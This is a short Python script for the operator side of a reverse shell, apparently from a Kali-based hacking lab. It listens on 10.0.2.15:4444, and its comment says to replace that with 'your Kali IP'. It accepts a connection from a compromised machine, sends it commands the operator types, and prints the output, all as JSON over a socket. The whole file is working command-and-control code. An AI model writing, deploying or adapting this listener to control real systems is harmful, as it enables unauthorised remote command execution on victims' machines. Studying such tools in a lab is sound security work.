import socket
import json
import base64

def listen_on(ip, port):
	global target
	listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	listener.bind((ip, port))
	listener.listen(0)
	print("Listening...")
	target, address = listener.accept()
	print(f"Connection from {address} established.")


def send(data):
	json_data = json.dumps(data)
	target.send(json_data.encode('utf-8'))


def receive():
	json_data = ''
	while True:
		try:
			json_data += target.recv(1024).decode('utf-8')
			return json.loads(json_data)
			
		except ValueError:
			continue


def server_run():
	# Display welcome message (Eg. Starting interactive shell...)
	print("Starting interactive shell...")

	# Loop for taking in user input (commands), sending request, receiving response and displaying contents
	while True:
		# Get user input and send request
		request = input("> ") 
		send(request)

		# Check for exit condition
		if request == "exit":
			print("Disconnected")
			break

		# Receive the reponse and print to terminal
		response = receive()

		if response is None:
			print("Connection lost")
			break
		
		print(response)	
		
	return
    
    	  
def main():
	listen_on('10.0.2.15', 4444) #Replace 10.0.2.15 with your Kali IP
	
	server_run()
	
	
	
	
if __name__ == "__main__":
	main()



